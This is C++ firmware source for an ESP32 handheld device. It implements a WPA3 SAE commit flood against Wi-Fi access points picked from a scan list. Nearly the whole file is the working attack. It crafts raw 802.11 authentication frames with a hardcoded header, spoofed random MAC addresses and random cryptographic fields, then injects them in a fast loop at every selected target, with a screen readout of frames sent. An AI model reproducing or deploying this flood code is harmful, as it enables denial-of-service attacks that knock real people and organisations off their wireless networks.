/*
 * WPA3 SAE Commit Flood (lite) — see header.
 */

#include "sae_attack.h"
#include "target_list.h"
#include "wificonfig.h"
#include "utils.h"
#include "Touchscreen.h"

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_random.h>
#include <string.h>

#define DARK_GRAY 0x4208

#define BTN_UP     6
#define BTN_DOWN   3

namespace SaeAttack {

// SAE Commit frame header (32 bytes). After this we append:
//   [32..63]  scalar (32 bytes random)
//   [64..127] element (64 bytes random — "x" and "y" coordinates of a P-256 point)
// Total frame: 128 bytes.
//
// Field layout in the header:
//   [0..1]   0xB0 0x00 = type Mgmt, subtype Auth
//   [2..3]   Duration
//   [4..9]   Destination = target AP BSSID
//   [10..15] Source = our spoofed STA MAC (random)
//   [16..21] BSSID = target AP BSSID
//   [22..23] Sequence / fragment
//   [24..25] Auth algorithm: 0x0003 = SAE
//   [26..27] Auth seq: 0x0001 = Commit
//   [28..29] Status: 0x0000 = success
//   [30..31] Finite Cyclic Group: 0x0013 = 19 (NIST P-256)
static const uint8_t sae_commit_header[32] = {
  0xb0, 0x00, 0x00, 0x00,
  0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
  0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
  0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,
  0x00, 0x00,
  0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00
};

static bool      attackActive = false;
static uint32_t  totalFrames  = 0;
static uint32_t  lastUiUpdate = 0;
static uint32_t  lastBtnMs = 0;
static const uint32_t BTN_DEBOUNCE_MS = 200;

static void sendSAECommitLite(const uint8_t bssid[6], uint8_t channel) {
  uint8_t frame[128];
  memcpy(frame, sae_commit_header, 32);

  // Spoofed STA MAC (locally administered, unicast)
  uint8_t src_mac[6];
  esp_fill_random(src_mac, 6);
  src_mac[0] = (src_mac[0] & 0xFE) | 0x02;

  for (int i = 0; i < 6; i++) {
    frame[4 + i]  = bssid[i];    // destination = AP
    frame[10 + i] = src_mac[i];  // source = us
    frame[16 + i] = bssid[i];    // BSSID = AP
  }

  // Scalar (32B) + Element (64B) — random bytes, no ECP math
  esp_fill_random(frame + 32, 96);

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  totalFrames++;
}

static void drawTopStatus() {
  tft.fillRect(35, 20, 205, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(attackActive ? TFT_RED : TFT_WHITE);
  tft.setCursor(35, 24);
  tft.printf("SAE     %d sel  %u TX",
             TargetList::selectedCount(), (unsigned)totalFrames);
  tft.setTextColor(attackActive ? TFT_GREEN : TFT_DARKGREY);
  tft.setCursor(170, 24);
  tft.print(attackActive ? "ACTIVE" : "PAUSED");
}

static void drawInfoBlock() {
  tft.fillRect(0, 45, tft.width(), tft.height() - 60, TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW);
  tft.setCursor(2, 50);
  tft.print("WPA3 SAE Commit Flood (lite)");
  tft.setTextColor(TFT_DARKGREY);
  tft.setCursor(2, 65);
  tft.print("Random-bytes scalar/element");
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(2, 85);
  tft.print("[UP]     Toggle ON/OFF");
  tft.setCursor(2, 100);
  tft.print("[SELECT] Exit");

  tft.setCursor(2, 125);
  tft.setTextColor(TFT_CYAN);
  tft.print("Selected APs:");
  tft.setTextColor(TFT_WHITE);
  int row = 0;
  for (int i = 0; i < TargetList::targetCount && row < 9; i++) {
    if (!TargetList::targets[i].selected) continue;
    tft.setCursor(2, 145 + row * 14);
    char ssid_show[18];
    int sl = strlen(TargetList::targets[i].ssid);
    if (sl > 17) sl = 17;
    memcpy(ssid_show, TargetList::targets[i].ssid, sl);
    ssid_show[sl] = '\0';
    const char* auth = "?";
    switch (TargetList::targets[i].auth) {
      case TargetList::AUTH_OPEN: auth = "OPEN"; break;
      case TargetList::AUTH_WEP:  auth = "WEP";  break;
      case TargetList::AUTH_WPA:  auth = "WPA";  break;
      case TargetList::AUTH_WPA2: auth = "WPA2"; break;
      case TargetList::AUTH_WPA3: auth = "WPA3"; break;
    }
    tft.printf("%-17s %s c%d", ssid_show, auth,
               (int)TargetList::targets[i].channel);
    row++;
  }
  if (TargetList::selectedCount() == 0) {
    tft.setTextColor(TFT_RED);
    tft.setCursor(2, 145);
    tft.print("No targets selected.");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(2, 165);
    tft.print("Run AP Scan & Select first.");
  }
}

void saeAttackSetup() {
  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();

  attackActive = false;
  totalFrames = 0;

  pcf.pinMode(BTN_UP, INPUT_PULLUP);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();

  Serial.println("[SAE] ready, awaiting toggle");

  float v = readBatteryVoltage();
  drawStatusBar(v, false);
  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  drawInfoBlock();
  drawTopStatus();
  lastUiUpdate = millis();
}

void saeAttackLoop() {
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  uint32_t now = millis();
  if (now - lastBtnMs > BTN_DEBOUNCE_MS) {
    if (!pcf.digitalRead(BTN_UP)) {
      attackActive = !attackActive;
      Serial.printf("[SAE] %s\n", attackActive ? "STARTED" : "PAUSED");
      lastBtnMs = now;
      drawTopStatus();
    }
  }

  if (attackActive) {
    for (int i = 0; i < TargetList::targetCount; i++) {
      if (!TargetList::targets[i].selected) continue;
      sendSAECommitLite(TargetList::targets[i].bssid,
                        TargetList::targets[i].channel);
    }
  }

  if (now - lastUiUpdate > 300) {
    drawTopStatus();
    lastUiUpdate = now;
  }

  delay(attackActive ? 10 : 30);
}

}  // namespace SaeAttack
